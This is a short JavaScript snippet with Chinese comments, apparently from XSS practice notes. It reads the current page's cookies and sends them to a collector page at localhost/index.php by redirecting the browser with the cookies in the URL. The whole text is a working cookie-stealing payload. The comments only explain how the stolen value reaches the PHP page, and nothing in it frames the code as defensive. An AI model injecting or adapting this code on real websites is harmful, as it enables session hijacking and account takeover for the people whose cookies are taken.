//javescript 代码 把该窗口的cookie值放到变量cookie里
var cookie=document.cookie;
//href 是跳转到localhost.php下 然后该窗口的cookie值已经被window下的cookie值就赋予到localhost值里面了
window.location.href  = 'http://localhost/index.php?cookie='+cookie;
